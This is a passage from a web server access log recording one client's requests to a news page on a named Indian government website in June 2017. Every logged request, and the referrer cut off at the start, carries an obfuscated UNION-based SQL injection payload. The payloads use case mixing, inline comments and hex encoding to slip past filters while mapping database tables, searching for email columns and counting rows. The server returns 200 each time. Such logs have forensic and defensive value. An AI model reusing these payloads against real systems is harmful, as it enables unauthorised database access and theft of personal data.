"http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+2,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:49 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_future_projects_info),4,5+and+'0'='0 HTTP/1.1" 200 18129 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_future_projects_info),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:50 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+3,1),4,5+and+'0'='0 HTTP/1.1" 200 18120 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x25656d61696c25+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+3,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
